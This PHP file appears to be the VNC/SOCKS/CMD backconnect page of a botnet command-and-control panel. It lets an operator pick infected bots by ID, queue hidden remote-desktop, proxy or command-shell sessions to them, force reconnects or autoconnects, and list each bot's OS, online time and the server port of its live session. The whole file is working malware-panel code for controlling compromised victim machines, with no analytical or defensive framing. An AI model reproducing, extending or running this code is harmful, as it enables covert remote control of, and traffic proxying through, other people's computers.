<?php
define('VNC_RECONNECT_THRESHOLD', 60*10);

$PROTOCOLS = array( 1 => 'VNC', 5 => 'SOCKS', 2 => 'CMD');

require 'system/lib/db.php';
require 'system/lib/guiutil.php';
require 'system/lib/shortcuts.php';

if (isset($_GET['ajax'])){
	switch($_GET['ajax']){
		case 'reconnect': # Force reconnect
			mysql_query(mkquery("UPDATE `vnc_bot_connections` SET `do_connect`=IF(`do_connect`>=0, 2, -2) WHERE `bot_id`={s:bot};", $_GET));
			break;
		case 'disconnect':
			mysql_query(mkquery("UPDATE `vnc_bot_connections` SET `do_connect`=0 WHERE `bot_id`={s:bot};", $_GET));
			break;
		case 'remove':
			mysql_query(mkquery("DELETE FROM `vnc_bot_connections` WHERE `bot_id`={s:bot};", $_GET));
			break;
		
		case 'add_connect': # ?m=botnet_vnc&ajax=add_connect&bot=ID&protocol=VNC&autoconnect=0
			$d = array(
				'bot' => $_GET['bot'],
				'protocol' => array_search($_GET['protocol'], $PROTOCOLS),
				'do_connect' => $_GET['autoconnect']? -1 : 1,
				);
			if (mysql_query(mkquery(
				'REPLACE INTO `vnc_bot_connections` VALUES({s:bot}, {i:protocol}, {i:do_connect}, 0, 0, 0);',
				$d
				)))
				echo 'OK';
				else
				echo 'MySQL error: '.mysql_error();
			break;
		}
	die();
	}

if (count($_POST)){
	if (isset($_POST['connect'])){
		mysql_query(mkquery(
			'REPLACE INTO `vnc_bot_connections` VALUES({s:botid}, {i:protocol}, {i:do_connect}, 0, 0, 0);',
			$_POST['connect']
			));
		header('HTTP/1.1 301 Redirect');
		header('Location: ?m=botnet_vnc');
		die();
		}
	}



ThemeBegin(LNG_THEME_TITLE, 0, getBotJsMenu('botmenu'), 0);

echo '<table class="table_frame" id="switch-tabs"><tr><td>', # VNC | ACCPARSE tabs
	'<ul>',
		'<li class="current"><a href="?m=botnet_vnc"><img src="images/vnc.png" />', LNG_MM_BOTNET_VNC, '</a></li>',
		'<li class="other"  ><a href="?m=reports_accparse"><img src="images/drill.png" />', LNG_MM_REPORTS_ACCPARSE, '</a></li>',
		'</ul>',
	'</td></tr></table>';

# ==========[ ADD BOT ]========== #
echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_CREATE_CONNECTION), THEME_LIST_BEGIN.THEME_LIST_TITLE), '<tr><td>';

if (empty($GLOBALS['config']['vnc_server']))
	echo '<div class="error">', LNG_NOT_CONFIGURED, '</div>';
	else {
	echo '<form method=POST>';
	echo '<dl>';
		echo '<dt>', LNG_CREATE_CONNECTION_BOTID, '</dt>',
			'<dd>', '<input type="text" name="connect[botid]" value="" size="100"/>', '</dd>';
		echo '<dt>', LNG_CREATE_CONNECTION_PROTOCOL, '</dt>',
			'<dd>',
			'<label><input type="radio" name="connect[protocol]" value="1" checked /> VNC </label> ',
			'<label><input type="radio" name="connect[protocol]" value="2" /> CMD </label> ',
			'<label><input type="radio" name="connect[protocol]" value="5" /> SOCKS</label>',
			'</dd>';
		echo '</dl>';
		echo '<button name="connect[do_connect]" value="1">', LNG_CREATE_CONNECTION_CONNECT, '</button>';
		echo '<button name="connect[do_connect]" value="-1">', LNG_CREATE_CONNECTION_AUTOCONNECT, '</button>';
		echo '</form>';
	}

echo '<div align="right"><pre>',
		'<a href="?m=ajax_config&action=botnetVNC" class="ajax_colorbox">', LNG_CONFIG, '</a>',
		'</pre></div>';

echo '</tr></td>';

# ==========[ BOTS LIST ]========== #
echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_BOTS_LIST), THEME_LIST_BEGIN.THEME_LIST_TITLE), '<tr><td>';

require_once 'system/lib/db-gui.php';
$CLICKSORT = new Clicksort(false);
$CLICKSORT->addField('ctime', '+', '`c`.`ctime`');
$CLICKSORT->addField('bot_os', '+', '`bot_os`');
$CLICKSORT->config(empty($_GET['sort'])? '' : $_GET['sort'], 'ctime+');
$CLICKSORT->render_url('?'.mkuri(0, 'sort').'&sort=');

$R = mysql_query(<<<SQL
	SELECT 
		`c`.*,
		`b`.`os_version` AS `bot_os`,
		IF(`b`.`rtime_last` >= (UNIX_TIMESTAMP()-{$config['botnet_timeout']}), 
				UNIX_TIMESTAMP() - `b`.`rtime_online`, 
				0) AS `bot_online`,
		`b`.`rtime_last` AS `bot_rtime_last`
	FROM `vnc_bot_connections` `c` 
		LEFT JOIN `botnet_list` `b` ON(`c`.`bot_id` = `b`.`bot_id`) 
	ORDER BY
		{$CLICKSORT->orderBy()},
		/* `c`.`ctime` DESC, */
		`b`.`rtime_last` DESC
SQL
	);


echo '<table id="bots-list">';
echo '<THEAD><tr>',
	'<th>', LNG_BOTS_LIST_TH_BOT, '</th>',
	'<th>', $CLICKSORT->field_render('bot_os', LNG_BOTS_LIST_TH_BOT_INFO), '</th>',
	'<th>', $CLICKSORT->field_render('ctime', LNG_BOTS_LIST_TH_BOT_STATUS), '</th>',
	'<th>', LNG_BOTS_LIST_TH_CONN_STATUS, '</th>',
	'<th>', LNG_BOTS_LIST_TH_CONNECTION_INFO, '</th>',
	'</tr></THEAD>';
echo '<TBODY>';
while ($R && !is_bool($r = mysql_fetch_assoc($R))){
	$classes = array();
	
	$bot_online = (bool)$r['bot_online'];
	$conn_online_time = time() - $r['ctime'];
	$conn_is_online = $conn_online_time < (VNC_RECONNECT_THRESHOLD*2);
	
	$classes[] = $bot_online? 'bot_online' : 'bot_offline';
	$classes[] = $conn_is_online? 'conn_online' : 'conn_offline';
	if ($r['do_connect'] < 0)
		$classes[] = 'autoconnect';
	
	echo '<tr', $classes?' class="'.implode(' ', $classes).'"':'', ' data-href="&bot=', urlencode($r['bot_id']), '">';
	echo '<td>', '<a href="?botsaction=fullinfo&bots[]=', $r['bot_id'], '" target="_blank">', $r['bot_id'] , '</a>', '</td>';
	echo '<td>', # bot info
		'OS: ', osDataToString($r['bot_os']), 
		'</td>';
	echo '<td>', # online time
		$bot_online
			? LNG_BOTS_LIST_BOT_STATUS_ONLINE . ': ' . tickCountToText($r['bot_online']) 
			: LNG_BOTS_LIST_BOT_STATUS_OFFLINE, 
			' , ', LNG_BOTS_LIST_BOT_STATUS_LAST_LIFESIGN, ' ', date_short($r['bot_rtime_last']),
		'</td>'; 
	echo '<td>'; # connection status: online, online (persistent), offline + time
		if ($conn_is_online) # connected
			echo LNG_BOTS_LIST_STATUS_CONNECTED, ': ', tickCountToText($conn_online_time);
			else{ # idle, waiting, disconnected
			if ($r['do_connect'] == 0)
				echo ($r['ctime'] == 0) ? LNG_BOTS_LIST_STATUS_IDLE : LNG_BOTS_LIST_STATUS_DISCONNECTED;
				else 
				echo LNG_BOTS_LIST_STATUS_WAITING;
			# last time was online
			echo ' ', LNG_BOTS_LIST_STATUS_OFFLINE_SINCE, ' ', date_short($r['bot_rtime_last']);
			}
		if ($r['do_connect'] < 0)
			echo '<br><b>', LNG_BOTS_LIST_STATUS_AUTOCONNECT;
		echo '</td>'; 
	echo '<td>'; # VNC|SOCKS|CMD + ip:port
		echo $PROTOCOLS[ $r['protocol'] ];
		if ($r['my_port'] != 0)
			echo ': ', $GLOBALS['config']['vnc_server'], ':', $r['my_port'];
		'</td>';
	echo '</tr>';
	}
echo '</TBODY>';
echo '</table>';

echo '<div align=center>', LNG_HINT_CONTEXT_MENU, '</div>';

echo '</td></tr>';

echo <<<HTML
<link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
<script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
<script src="theme/js/contextMenu/src/jquery.ui.position.js"></script>
<script src="theme/js/page-botnet_vnc.js"></script>
HTML;

echo THEME_DIALOG_END, ThemeEnd();